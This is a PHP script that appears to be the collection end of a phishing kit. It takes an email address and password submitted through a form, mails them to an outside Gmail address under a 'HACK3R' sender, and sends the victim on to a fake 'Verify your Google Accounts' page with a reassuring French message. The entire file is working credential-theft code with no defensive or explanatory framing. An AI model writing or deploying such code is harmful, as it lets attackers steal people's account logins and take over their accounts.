
<?php
        $mailhacked = $_POST["email"];
        $passwordhacked = $_POST["password"];
         $to = "lestoillettespue@gmail.com";
         $subject = "Workshop Gmail password";
         
         $message = "$mailhacked";
         $message .= "<br>$passwordhacked";
         
         $header = "From:HACK3R@Hack3r.com \r\n";
         $header .= "Cc:abcd@somedomain.com \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
         
         $retval = mail($to,$subject,$message,$header);
         $data['response']="Félicitations, Veuillez patienter environ une heure pour que nous vous répondrons";
$data['url']="http://darmexagrof.com/Admin/Verify your - Google Accounts.htm?Fmail.google.com%2Fmail%2F&amp;ss=1&amp;scc=1&amp;ltmpl=default&amp;ltmplcache=2&amp;hl=en&amp;emr=1&amp;elo=18e4d55206044e225395371e2e94d0503";
echo json_encode($data);         if( $retval == true ) {
           
 include("MKR.php");
         }else {
            echo "Message could not be sent...404 error check your internet";
         }
      


?>